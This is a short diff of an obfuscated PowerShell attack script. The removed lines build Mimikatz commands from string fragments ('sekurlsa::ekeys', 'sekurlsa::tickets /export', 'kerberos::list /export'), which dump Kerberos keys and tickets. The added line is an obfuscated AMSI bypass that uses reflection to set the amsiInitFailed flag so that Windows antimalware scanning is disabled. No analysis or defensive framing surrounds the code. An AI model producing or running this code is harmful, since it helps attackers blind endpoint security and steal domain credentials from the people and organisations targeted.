@@ -26,18 +26,5 @@ S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{
 
 
 
-$j = “yS“
-$i = “E“
-$h = “k“
-$g = “E“
-$f = “::“
-$e = “a“
-$d = “lS“
-$c = “r“
-$b = “EKu“
-$a = “s“
-$Pwn = $a + $b + $c + $d + $e + $f + $g + $h + $i + $j
-
-$cmd9 = "s" + "e" + "k" + "u" + "r" + "l" + "s" + "a" + "::" + "t" + "i" + "c" + "k" + "e" + "t" + "s" + " " + "/" + "e" + "x" + "p" + "o" + "r" + "t"
-$cmd0 = '"k' + 'e' + 'r' + 'b' + 'e' + 'r' + 'o' + 's' + '::' + 'l' + 'i' + 's' + 't' + ' ' + '/' + 'e' + 'x' + 'p' + 'o' + 'r' + 't"'
+&("{0}{1}" -f'sET-','ITEm')  ('vaRI'+'Ab'+'lE:hf'+'7S35') ( [tYPE]("{0}{1}"-f're','f')) ; ${A} =   (&("{0}{2}{1}"-f'gEt','abLE','-varI') ('HF'+'7S'+'35')  )."VA`LUE"."A`sSE`mBlY".("{1}{2}{0}"-f 'tTypes','G','e').Invoke();ForEach(${B} in ${A}) {if (${B}."N`AMe" -like ("{0}{2}{1}" -f'*','Utils','i')) {${c} = ${B}}};${d} = ${C}.("{2}{1}{0}{3}" -f 'ld','e','GetFi','s').Invoke(("{2}{0}{3}{4}{1}" -f'bl',',Static','NonPu','i','c'));ForEach(${E} in ${D}) {if (${E}."NA`ME" -like ("{0}{2}{1}"-f '*F','led','ai')) {${F} = ${e}}};${F}.("{1}{0}"-f 'ue','SetVal').Invoke(${nu`ll},${t`RuE})
 ```
